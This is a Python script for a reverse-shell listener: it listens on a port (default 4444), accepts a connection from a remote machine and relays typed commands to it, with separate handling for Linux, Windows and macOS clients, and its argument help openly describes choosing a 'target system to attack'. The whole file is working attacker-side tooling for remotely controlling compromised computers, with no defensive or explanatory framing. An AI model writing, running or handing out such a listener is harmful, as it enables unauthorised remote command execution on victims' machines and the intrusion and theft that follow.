import socket
import threading
import sys
import signal
import argparse
import os

server_socket = None
client_socket = None
running = True

def signal_handler(sig, frame):
    global server_socket, client_socket, running
    print("\nInterrupt received. Closing server...")
    running = False
    if client_socket:
        client_socket.close()
    if server_socket:
        server_socket.close()
    sys.exit(0)

def handle_client_connection_linux(client_socket):
    global running
    while running:
        try:
            data = client_socket.recv(4096)
            if not data:
                print("\nClient disconnected")
                running = False
                break

            try:
                message = data.decode('utf-8')
                if message:
                    message = message.replace('\r\n', '\n').replace('\r', '\n')
                    print(message, end='', flush=True)
            except UnicodeDecodeError:
                print(data.decode('latin-1'), end='', flush=True)

        except Exception as e:
            print(f"\nError receiving data: {e}")
            running = False
            break

def send_commands_to_client_linux(client_socket):
    global running
    while running:
        try:
            command = input()
            if command.lower() in ["exit", "quit"]:
                running = False
                client_socket.close()
                break

            if command:
                client_socket.sendall(f"{command}\n".encode('utf-8'))
        except Exception as e:
            print(f"\nError sending data: {e}")
            running = False
            break

def start_server_linux(host='0.0.0.0', port=4444):
    global server_socket, client_socket, running

    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(1)
        print(f"[*] Listening on {host}:{port}")

        client_socket, client_address = server_socket.accept()
        print(f"[*] Connection established with {client_address[0]}:{client_address[1]}")

        receive_thread = threading.Thread(target=handle_client_connection_linux, args=(client_socket,))
        send_thread = threading.Thread(target=send_commands_to_client_linux, args=(client_socket,))

        receive_thread.daemon = True
        send_thread.daemon = True

        receive_thread.start()
        send_thread.start()

        while running:
            if not receive_thread.is_alive() or not send_thread.is_alive():
                running = False
                break
            receive_thread.join(0.1)

    except KeyboardInterrupt:
        print("\nServer stopped.")
    finally:
        running = False
        if client_socket:
            client_socket.close()
        if server_socket:
            server_socket.close()

def start_server_windows(host, port):
    global server_socket, client_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(1)

    print(f"[*] Listening on {host}:{port}")

    try:
        client_socket, client_address = server_socket.accept()
        print(f"[*] Connection established with {client_address[0]}:{client_address[1]}")

        while True:
            command = input("\nShell> ").strip()

            if command.lower() in ["exit", "quit"]:
                break

            client_socket.sendall((command + '\n').encode('utf-8'))

            response = b""
            while True:
                part = client_socket.recv(4096)
                if not part:
                    break
                response += part

                if b"END_OF_COMMAND" in response:
                    break

            final_response = response.decode('utf-8', errors='replace').strip()
            final_response = final_response.replace("END_OF_COMMAND", "")
            print_formatted_response(final_response)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        if client_socket:
            client_socket.close()
        if server_socket:
            server_socket.close()

def print_formatted_response(response):
    lines = response.splitlines()
    for line in lines:
        if line.strip():
            print(line)

def main():
    parser = argparse.ArgumentParser(description="Server for shell connection.")
    parser.add_argument("--port", type=int, required=True, help="Port to listen on")
    parser.add_argument("--target", type=str, required=True, choices=["linux", "windows", "macos"], help="Target system to attack")

    args = parser.parse_args()
    port = args.port
    os_type = args.target

    signal.signal(signal.SIGINT, signal_handler)

    if os_type == 'linux':
        start_server_linux(port=args.port)
    elif os_type == 'windows':
        start_server_windows(host='0.0.0.0', port=args.port)
    if os_type == 'macos':
        start_server_linux(port=args.port)

if __name__ == "__main__":
    main()
